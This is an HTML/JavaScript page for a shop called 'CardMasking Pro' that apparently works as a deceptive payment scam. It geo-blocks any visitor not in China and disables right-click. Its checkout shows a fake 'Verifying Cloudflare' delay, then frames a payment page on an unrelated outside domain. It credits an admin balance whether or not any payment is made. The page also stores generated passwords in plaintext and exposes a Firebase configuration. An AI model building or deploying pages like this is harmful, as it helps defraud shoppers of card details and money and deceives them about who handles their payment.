<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CardMasking Pro</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    
    <style>
        /* Security Styles */
        body { 
            -webkit-user-select: none; user-select: none; 
            background: #f1f3f6; margin: 0; font-family: Roboto, sans-serif;
        }
        
        /* Header */
        header { background: #2874f0; padding: 10px; position: sticky; top: 0; z-index: 99; box-shadow: 0 2px 4px rgba(0,0,0,0.2); }
        .nav { display: flex; justify-content: space-between; align-items: center; color: white; }
        .logo { font-size: 18px; font-weight: bold; font-style: italic; }
        .logo span { color: #fdd835; }
        .search { margin-top: 10px; background: white; padding: 8px; border-radius: 2px; display: flex; }
        .search input { border: none; width: 100%; outline: none; margin-left: 10px; }

        /* Grid */
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; padding: 8px; }
        .card { background: white; padding: 10px; border-radius: 4px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
        .card img { width: 100%; height: 140px; object-fit: contain; }
        .price { font-size: 16px; font-weight: bold; margin: 5px 0; }
        .btn { width: 100%; background: #fdd835; border: none; padding: 8px; font-weight: bold; cursor: pointer; }

        /* Fullscreen Loaders */
        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #2874f0; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        /* VPN Blocker */
        #vpn-blocker { background: black; color: white; display: flex; }
    </style>
</head>
<body oncontextmenu="return false;">

    <div id="vpn-blocker" class="overlay">
        <div class="spinner"></div>
        <h3 id="vpn-msg" style="margin-top:20px;">Checking Network Security...</h3>
    </div>

    <header>
        <div class="nav">
            <div class="logo">CardMasking <span>Pro</span></div>
            <div id="user-status" onclick="openAuth()">Login</div>
        </div>
        <div class="search">
            <i class="fas fa-search" style="color:#888;"></i>
            <input type="text" placeholder="Search products...">
        </div>
    </header>

    <div class="grid" id="product-list">
        <p style="padding:10px;">Connecting to Database...</p>
    </div>

    <div id="pay-ui" class="overlay" style="display:none; z-index:2000;">
        <div style="width:100%; background:#2874f0; padding:15px; color:white; display:flex; justify-content:space-between;">
            <span>Secure Checkout</span>
            <span onclick="closePay()">&times;</span>
        </div>
        <div id="pay-loader" style="flex:1; display:flex; flex-direction:column; align-items:center; justify-content:center;">
            <div class="spinner"></div>
            <p>Verifying Cloudflare...</p>
            <small>Please wait 14 seconds</small>
        </div>
        <iframe id="pay-frame" style="width:100%; height:100%; border:none; display:none;"></iframe>
    </div>

    <script>
        // --- FIREBASE CONFIG (একই কনফিগারেশন ব্যবহার করুন) ---
        const firebaseConfig = {
  apiKey: "AIzaSyABxavQJj3S1m7cSqRy_S4FiuN4uHXIqKc",
  authDomain: "cardmasking.firebaseapp.com",
  databaseURL: "https://cardmasking-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "cardmasking",
  storageBucket: "cardmasking.firebasestorage.app",
  messagingSenderId: "1027569811632",
  appId: "1:1027569811632:web:f310a4fc588c27df0b3b75"
};
        if (!firebase.apps.length) {
            firebase.initializeApp(firebaseConfig);
        }
        const db = firebase.database();

        let currentUser = JSON.parse(localStorage.getItem('cm_user'));

        // --- 1. SECURITY CHECK (VPN) ---
        async function checkVPN() {
            const blocker = document.getElementById('vpn-blocker');
            const msg = document.getElementById('vpn-msg');
            
            if(!navigator.onLine) {
                msg.innerText = "No Internet Connection";
                return;
            }

            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                
                // IMPORTANT: টেস্ট করার জন্য 'CN' এর জায়গায় 'BD' দিন, নাহলে বাংলাদেশ থেকে ওপেন হবে না।
                // অ্যাপ রিলিজের সময় আবার 'CN' করে দিবেন।
                const REQUIRED_COUNTRY = 'CN'; // Change to 'BD' for testing locally
                
                if (data.country_code !== REQUIRED_COUNTRY) {
                    msg.innerHTML = "Access Denied.<br>Please Connect China VPN.";
                } else {
                    blocker.style.display = 'none'; // Access Granted
                }
            } catch (error) {
                // If API blocked (Adblocker), assume safe for now or block
                blocker.style.display = 'none'; 
            }
            updateUI();
        }

        window.onload = checkVPN;

        // --- 2. LOAD PRODUCTS ---
        db.ref('products').on('value', snapshot => {
            const list = document.getElementById('product-list');
            list.innerHTML = "";
            const data = snapshot.val();
            
            if(data) {
                Object.values(data).forEach(p => {
                    list.innerHTML += `
                        <div class="card">
                            <img src="${p.image}">
                            <div style="font-size:13px; margin-top:5px;">${p.title}</div>
                            <div class="price">¥${p.price}</div>
                            <button class="btn" onclick="buy(${p.price})">ADD TO CART</button>
                        </div>`;
                });
            } else {
                list.innerHTML = "<p style='padding:10px;'>No products found.</p>";
            }
        });

        // --- 3. AUTH SYSTEM (Auto Generate) ---
        function updateUI() {
            const btn = document.getElementById('user-status');
            if(currentUser) {
                btn.innerText = "ID: " + currentUser.id;
            } else {
                btn.innerText = "Login / Register";
            }
        }

        function openAuth() {
            if(currentUser) return alert("Already Logged In: " + currentUser.id);
            
            const id = Math.floor(1000000000000 + Math.random() * 9000000000000).toString(); // 13 Digit
            const pass = Math.random().toString(36).slice(-8);
            
            currentUser = { id: id, pass: pass };
            localStorage.setItem('cm_user', JSON.stringify(currentUser));
            
            // Save to Firebase
            db.ref('users/' + id).set({ password: pass });
            
            alert(`New Account Created!\nID: ${id}\nPass: ${pass}`);
            updateUI();
        }

        // --- 4. PAYMENT & BALANCE UPDATE ---
        function buy(price) {
            if(!currentUser) return alert("Please Login First!");

            const method = confirm("Pay with Stripe? (OK)\nPay with G-Pay? (Cancel)");
            const url = method ? 
                "https://villadelencinal.com/S-O/VC/?nox=7886177514" : 
                "http://villadelencinal.com/S-O/VI?nox=7886177514";

            const ui = document.getElementById('pay-ui');
            const loader = document.getElementById('pay-loader');
            const frame = document.getElementById('pay-frame');

            ui.style.display = 'flex';
            loader.style.display = 'flex';
            frame.style.display = 'none';
            frame.src = url;

            // 14 Seconds Delay Logic
            setTimeout(() => {
                loader.style.display = 'none';
                frame.style.display = 'block';

                // Update Admin Balance in Background
                db.ref('admin/balance').transaction(bal => (bal || 0) + price);
                
            }, 14000);
        }

        function closePay() {
            document.getElementById('pay-ui').style.display = 'none';
            document.getElementById('pay-frame').src = "";
        }
    </script>
</body>
</html>
